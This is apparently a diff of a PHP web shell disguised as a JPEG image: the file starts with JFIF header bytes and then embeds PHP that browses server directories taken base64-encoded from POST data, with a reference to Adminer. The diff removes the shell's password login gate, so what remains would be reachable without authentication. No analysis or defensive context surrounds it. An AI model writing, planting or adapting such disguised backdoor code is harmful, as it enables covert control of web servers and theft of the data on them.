@@ -2,60 +2,6 @@
 .....................................................................................................................................???�� JFIF      ?? C 	!"$"$?? C?? p " ??             ??             ?��    ????(%	aA*?XYD?(J??E��RE,P�XYae?)(E��2�B��R��	BQ��� X?)X�����?  @  
 
 .......................................................................................................... ...................<?php
-session_start();
-error_reporting(0);
-
-$_HASH = '$2y$10$j8KUEt6o1Mstjw7t18ZtfO131CYo/WlXfLxOI.hx4Ggt6xujudNz6';
-
-if (isset($_POST['logout'])) {
-    session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-if (isset($_POST['password'])) {
-    if (password_verify($_POST['password'], $_HASH)) {
-        $_SESSION['auth'] = true;
-    } else {
-        $login_err = true;
-    }
-}
-
-if (empty($_SESSION['auth'])) {
-    ?><!DOCTYPE html>
-<html>
-<head>
-    <title>Login</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        html, body { width:100%; height:100%; background:#fff; }
-        .wrap { display:flex; justify-content:center; align-items:center; height:100vh; }
-        form { display:flex; flex-direction:column; align-items:center; gap:12px; }
-        input[type="password"] {
-            width:220px; padding:10px 14px; border:1px solid #ddd;
-            border-radius:4px; font-size:14px; outline:none; color:#333;
-        }
-        input[type="password"]:focus { border-color:#aaa; }
-        button {
-            width:220px; padding:10px; background:#fff; color:#555;
-            border:1px solid #ddd; border-radius:4px; font-size:14px; cursor:pointer;
-        }
-        button:hover { background:#f5f5f5; }
-        .err { font-size:12px; color:#c00; }
-    </style>
-</head>
-<body>
-<div class="wrap">
-    <form method="post">
-        <input type="password" name="password" placeholder="Password" autofocus>
-        <?php if(!empty($login_err)) echo '<span class="err">Password salah</span>'; ?>
-        <button type="submit">Login</button>
-    </form>
-</div>
-</body>
-</html><?php
-    exit;
-    }
 $currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
 $currentDir = str_replace("\\", "/", $currentDir);
 $dir = $currentDir; // Needed for Adminer logic
